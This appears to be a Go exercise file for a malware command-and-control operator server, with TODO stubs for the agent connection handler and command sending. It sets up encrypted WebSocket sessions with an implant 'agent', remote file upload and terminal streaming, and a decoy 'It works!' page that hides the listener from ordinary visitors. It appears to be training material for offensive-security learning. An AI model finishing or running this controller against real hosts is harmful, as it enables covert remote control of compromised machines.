package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sync"

	"github.com/coder/websocket"
	"golang.org/x/crypto/hkdf"
)

// --- Crypto (same as agent) ---

var errCiphertextShort = errors.New("ciphertext too short")

func deriveKeys(privRaw, peerPubRaw []byte) (key [32]byte, id [8]byte, err error) {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(privRaw)
	if err != nil {
		return key, id, err
	}
	pub, err := curve.NewPublicKey(peerPubRaw)
	if err != nil {
		return key, id, err
	}
	secret, err := priv.ECDH(pub)
	if err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-aead")), key[:]); err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-id")), id[:]); err != nil {
		return key, id, err
	}
	return
}

func sealAEAD(key [32]byte, plaintext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func openAEAD(key [32]byte, ciphertext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, errCiphertextShort
	}
	return gcm.Open(nil, ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():], nil)
}

func newGCM(key [32]byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

// --- Wire types ---

type agentCmd struct {
	Op   string          `json:"op"`
	Arg  string          `json:"arg,omitempty"`
	Data json.RawMessage `json:"data,omitempty"`
}

// --- Agent session ---

type agentSession struct {
	id      string
	conn    *websocket.Conn
	key     [32]byte
	writeMu sync.Mutex
	cmdMu   sync.Mutex
	respCh  chan json.RawMessage
	ptyMu   sync.RWMutex
	ptySub  chan []byte
	done    chan struct{}
}

var agent struct {
	sync.Mutex
	id       string
	key      [32]byte
	agentPub []byte
	session  *agentSession
}

const decoyHTML = `<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>It works!</h1><p>The server is running.</p></body></html>`

func main() {
	pkiDir := os.Getenv("RKLINGS_PKI_DIR")
	if pkiDir == "" {
		fmt.Fprintln(os.Stderr, "RKLINGS_PKI_DIR is required")
		os.Exit(1)
	}

	operatorKey, err := os.ReadFile(filepath.Join(pkiDir, "operator.key"))
	if err != nil {
		log.Fatalf("read operator key: %v", err)
	}
	agentPub, err := os.ReadFile(filepath.Join(pkiDir, "agent.pub"))
	if err != nil {
		log.Fatalf("read agent pub: %v", err)
	}

	key, id, err := deriveKeys(operatorKey, agentPub)
	if err != nil {
		log.Fatalf("derive keys: %v", err)
	}

	agent.key = key
	agent.id = hex.EncodeToString(id[:])
	agent.agentPub = agentPub

	addr := envOr("RKLINGS_LISTEN_ADDR", ":8443")

	go startWeb()
	if os.Getenv("RKLINGS_NO_TUI") != "1" {
		go startTUI()
	}

	fmt.Printf("[*] Listening on %s for agent connections\n", addr)
	fmt.Printf("[*] Expected agent ID: %s\n", agent.id)
	webAddr := envOr("RKLINGS_WEB_ADDR", "127.0.0.1:8080")
	fmt.Printf("[*] Webapp on http://%s\n", webAddr)

	mux := http.NewServeMux()
	mux.HandleFunc("/", handleAgent)
	log.Fatal(http.ListenAndServe(addr, mux))
}

func handleAgent(w http.ResponseWriter, r *http.Request) {
	// TODO 1: implement WebSocket agent handler.
	//
	// Steps:
	// 1. Check if the request has an Upgrade header (WebSocket upgrade).
	//    If so, call handleAgentWS and return.
	// 2. Otherwise, serve the decoy page.
	serveDecoy(w)
}

func handleAgentWS(w http.ResponseWriter, r *http.Request) {
	// TODO 1 (continued): implement WebSocket authentication and session.
	//
	// Steps:
	// 1. Accept the WebSocket connection with websocket.Accept(w, r, nil).
	// 2. Read the first binary message with a 30-second context timeout.
	// 3. The first message is: agentPubKey(32 bytes) || AEAD ciphertext.
	//    Verify the message is long enough (32 + nonce + tag minimum).
	// 4. Compare msg[:32] with agent.agentPub using bytes.Equal.
	// 5. Decrypt the remainder with openAEAD(agent.key, msg[32:]).
	// 6. Create an agentSession with the conn, key, a buffered respCh (cap 1),
	//    and a done channel.
	// 7. Store it in agent.session (close old session's conn if replacing).
	// 8. Run the read pump (inline loop or separate function):
	//    - Read binary messages with conn.Read(ctx).
	//    - Decrypt each with openAEAD.
	//    - Unmarshal into a struct with PTY (string) and Data (json.RawMessage).
	//    - If PTY is set: base64-decode it and send to session.ptySub (if subscribed).
	//    - If Data is set: send to session.respCh.
	// 9. On read error, clear agent.session and close the done channel.
}

func sendCommand(op, arg string, data json.RawMessage) (json.RawMessage, error) {
	// TODO 2: send a command to the agent over WebSocket and wait for the response.
	//
	// Steps:
	// 1. Lock agent, get session. If nil, return "no agent connected".
	// 2. Lock session.cmdMu (one command at a time).
	// 3. Marshal an agentCmd{Op, Arg, Data} to JSON.
	// 4. Seal it with sealAEAD(session.key, ...).
	// 5. Lock session.writeMu, write with conn.Write(ctx, MessageBinary, ct), unlock.
	// 6. Wait on session.respCh, session.done, or a 2-minute timeout.
	// 7. Return the response or an error.
	return nil, fmt.Errorf("implement WebSocket command send")
}

func sendUploadCommand(path string, rawData []byte) (json.RawMessage, error) {
	payload, _ := json.Marshal(struct {
		Path string `json:"path"`
		Data string `json:"data"`
	}{path, base64.StdEncoding.EncodeToString(rawData)})
	return sendCommand("UPLOAD", "", json.RawMessage(payload))
}

func connected() bool {
	agent.Lock()
	s := agent.session
	agent.Unlock()
	if s == nil {
		return false
	}
	select {
	case <-s.done:
		return false
	default:
		return true
	}
}

func getSession() *agentSession {
	agent.Lock()
	defer agent.Unlock()
	return agent.session
}

func serveDecoy(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	io.WriteString(w, decoyHTML)
}

func rawToString(raw json.RawMessage) string {
	var s string
	if json.Unmarshal(raw, &s) == nil {
		return s
	}
	return string(raw)
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}
